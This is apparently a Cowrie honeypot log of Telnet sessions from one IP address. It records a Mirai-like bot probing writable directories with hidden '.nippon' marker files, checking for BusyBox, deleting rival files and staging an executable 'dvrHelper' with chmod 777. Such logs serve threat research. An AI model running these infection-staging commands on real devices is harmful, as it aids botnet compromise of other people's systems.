+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc' > /proc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/proc'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /proc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /proc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /proc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /proc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/dev'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/pts' > /dev/pts/.nippon; /bin/busybox cat /dev/pts/.nippon; /bin/busybox rm /dev/pts/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/pts' > /dev/pts/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/dev/pts'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /dev/pts/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /dev/pts/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /dev/pts/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/pts/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/run' > /run/.nippon; /bin/busybox cat /run/.nippon; /bin/busybox rm /run/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/run' > /run/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/run'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /run/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /run/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /run/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /run/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/shm' > /dev/shm/.nippon; /bin/busybox cat /dev/shm/.nippon; /bin/busybox rm /dev/shm/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/shm' > /dev/shm/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/dev/shm'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /dev/shm/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /dev/shm/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /dev/shm/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/shm/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/run/lock' > /run/lock/.nippon; /bin/busybox cat /run/lock/.nippon; /bin/busybox rm /run/lock/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/run/lock' > /run/lock/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/run/lock'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /run/lock/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /run/lock/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /run/lock/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /run/lock/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys/fs/fuse/connections' > /sys/fs/fuse/connections/.nippon; /bin/busybox cat /sys/fs/fuse/connections/.nippon; /bin/busybox rm /sys/fs/fuse/connections/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys/fs/fuse/connections' > /sys/fs/fuse/connections/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /sys/fs/fuse/connections/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /sys/fs/fuse/connections/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /sys/fs/fuse/connections/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /sys/fs/fuse/connections/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/boot' > /boot/.nippon; /bin/busybox cat /boot/.nippon; /bin/busybox rm /boot/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/boot' > /boot/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/boot'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /boot/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /boot/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /boot/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /boot/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/home' > /home/.nippon; /bin/busybox cat /home/.nippon; /bin/busybox rm /home/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/home' > /home/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/home'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /home/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /home/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /home/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /home/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/dev'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox ECCHI
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox ECCHI
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox cat /proc/mounts; /bin/busybox ECCHI
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /proc/mounts
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /proc/mounts
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox ECCHI
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /.t; rm /.sh; rm /.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /sys/.t; rm /sys/.sh; rm /sys/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /sys/.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /sys/.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /sys/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /proc/.t; rm /proc/.sh; rm /proc/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /proc/.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /proc/.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /proc/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /dev/.t; rm /dev/.sh; rm /dev/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /dev/pts/.t; rm /dev/pts/.sh; rm /dev/pts/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/pts/.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/pts/.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/pts/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /run/.t; rm /run/.sh; rm /run/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /run/.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /run/.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /run/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /.t; rm /.sh; rm /.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /dev/shm/.t; rm /dev/shm/.sh; rm /dev/shm/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/shm/.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/shm/.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/shm/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /run/lock/.t; rm /run/lock/.sh; rm /run/lock/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /run/lock/.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /run/lock/.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /run/lock/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /proc/sys/fs/binfmt_misc/.t; rm /proc/sys/fs/binfmt_misc/.sh; rm /proc/sys/fs/binfmt_misc/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /boot/.t; rm /boot/.sh; rm /boot/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /boot/.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /boot/.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /boot/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /home/.t; rm /home/.sh; rm /home/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /home/.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /home/.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /home/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /proc/sys/fs/binfmt_misc/.t; rm /proc/sys/fs/binfmt_misc/.sh; rm /proc/sys/fs/binfmt_misc/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /proc/sys/fs/binfmt_misc/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: rm /dev/.t; rm /dev/.sh; rm /dev/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/.t
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/.sh
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /dev/.human
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: cd /
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cd /
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cp /bin/echo dvrHelper
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cp /bin/echo dvrHelper
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: > /dvrHelper
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox chmod 777 /dvrHelper
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: chmod 777 /dvrHelper
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox ECCHI
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon; /bin/busybox cat /sys/.nippon; /bin/busybox rm /sys/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/sys'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /sys/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /sys/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /sys/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /sys/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc' > /proc/.nippon; /bin/busybox cat /proc/.nippon; /bin/busybox rm /proc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc' > /proc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/proc'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /proc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /proc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /proc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /proc/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/dev'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/pts' > /dev/pts/.nippon; /bin/busybox cat /dev/pts/.nippon; /bin/busybox rm /dev/pts/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/pts' > /dev/pts/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/dev/pts'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /dev/pts/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /dev/pts/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /dev/pts/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /dev/pts/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/run' > /run/.nippon; /bin/busybox cat /run/.nippon; /bin/busybox rm /run/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/run' > /run/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/run'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /run/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /run/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /run/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /run/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69'
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox cat /.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: cat /.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox rm /.nippon
+2017-06-12T10:11:57+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: rm /.nippon
